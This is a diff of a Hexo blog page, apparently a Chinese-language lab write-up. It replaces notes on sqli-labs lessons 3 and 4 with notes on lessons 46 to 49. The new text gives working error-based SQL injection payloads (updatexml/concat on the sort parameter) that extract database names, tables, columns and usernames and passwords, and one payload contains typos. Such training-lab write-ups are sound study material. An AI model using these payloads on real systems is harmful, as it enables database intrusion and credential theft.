@@ -5,17 +5,17 @@
   
 
   
-  <title>less 3 | Hexo</title>
+  <title>sqlilabs 46 47 48 49 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入) 输入单引号，根据报错信息确定咱们输入的内容存放到一对单引号加圆括号中了，猜想一下咱们输入1在数据库语句中的位置，形如select … from … where id&#x3D;(‘1’) …，在第一题中id&#x3D;1‘的后面单引号加上），其它保持不变就行了">
+  <meta name="description" content="46 数字型注入?sort&#x3D;1 即可 用报错注入吧 updatexml ?sort&#x3D;1 and updatexml(1,oncat(‘|’,(select group_concat(schema_name)from information_schemata.)),1) 爆数据库 太多了显示不下 限制一下?sort&#x3D;1 and updatexml(1,concat(‘|’,(select group">
 <meta property="og:type" content="article">
-<meta property="og:title" content="less 3">
-<meta property="og:url" content="http://example.com/2020/11/19/page-3/index.html">
+<meta property="og:title" content="sqlilabs 46 47 48 49">
+<meta property="og:url" content="http://example.com/2021/02/18/page-29/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入) 输入单引号，根据报错信息确定咱们输入的内容存放到一对单引号加圆括号中了，猜想一下咱们输入1在数据库语句中的位置，形如select … from … where id&#x3D;(‘1’) …，在第一题中id&#x3D;1‘的后面单引号加上），其它保持不变就行了">
+<meta property="og:description" content="46 数字型注入?sort&#x3D;1 即可 用报错注入吧 updatexml ?sort&#x3D;1 and updatexml(1,oncat(‘|’,(select group_concat(schema_name)from information_schemata.)),1) 爆数据库 太多了显示不下 限制一下?sort&#x3D;1 and updatexml(1,concat(‘|’,(select group">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-11-19T15:07:41.000Z">
-<meta property="article:modified_time" content="2020-11-19T15:16:22.329Z">
+<meta property="article:published_time" content="2021-02-18T03:01:52.000Z">
+<meta property="article:modified_time" content="2021-02-18T03:42:35.958Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -66,10 +66,10 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-page-3" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-page-29" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/11/19/page-3/" class="article-date">
-  <time datetime="2020-11-19T15:07:41.000Z" itemprop="datePublished">2020-11-19</time>
+    <a href="/2021/02/18/page-29/" class="article-date">
+  <time datetime="2021-02-18T03:01:52.000Z" itemprop="datePublished">2021-02-18</time>
 </a>
     
   </div>
@@ -80,7 +80,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      less 3
+      sqlilabs 46 47 48 49
     </h1>
   
 
@@ -88,15 +88,21 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</p>
-<p>输入单引号，根据报错信息确定咱们输入的内容存放到一对单引号加圆括号中了，猜想一下咱们输入1在数据库语句中的位置，形如select … from … where id=(‘1’) …，在第一题中id=1‘的后面单引号加上），其它保持不变就行了</p>
-<p>Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</p>
-<p>输入单引号页面无变化 双引号页面报错 据报错信息判断出咱们输入的内容被放到一队双引号和圆括号中， 猜想一下：select … from … where id=(”1”) …，把第一题中1后面的引号换成双引号加）就可以了</p>
+        <p>46 数字型注入?sort=1 即可</p>
+<p>用报错注入吧 updatexml</p>
+<p>?sort=1 and updatexml(1,oncat(‘|’,(select group_concat(schema_name)from information_schemata.)),1) 爆数据库 太多了显示不下</p>
+<p>限制一下?sort=1 and updatexml(1,concat(‘|’,(select group_concat(schema_name)from information_schema.schemata limit 0,1)),1) 从第一个开始显示一次显示一个 limit 0，1 更0就可以</p>
+<p>?sort=1 and updatexml(1,concat(‘|’,(select group_concat(table_name)from information_schema.tables where table_schema=’security’)),1) 爆表</p>
+<p>?sort=1 and updatexml(1,concat(‘|’,(select group_concat(column_name)from information_schema.columns where table_schema=’security’ and table_name=’users’)),1) users表的列</p>
+<p>?sort=1 and updatexml(1,concat(‘~’,(select concat_ws(‘|’,id,username,password)from security.users limit 0,1)),1)  爆数据 </p>
+<p>47 就sort=1’ 多一个单引号 </p>
+<p>48 49 关闭了错误回显 没办法用报错注入了 要么盲注 要么神奇的sqlmap</p>
+<p>复制一下地址后面加个sort=1 剩下的和之前的用id的一样了 </p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/19/page-3/" data-id="ckhoz9da20000n4v7fd4b2sqw" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/02/18/page-29/" data-id="cklac4j410000rwv7ev0tc0mz" class="article-share-link">Share</a>
       
       
     </footer>
@@ -105,19 +111,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2020/11/19/page-4/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          sqli-labs
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/11/07/Eclipse%20for%20PHP+Wampserver%E6%90%AD%E5%BB%BAPHP%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2021/02/15/page-28/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">Eclipse for PHP+Wampserver搭建PHP开发环境</div>
+      <div class="article-nav-title">sqlilabs 38 39 40 41</div>
     </a>
   
 </nav>
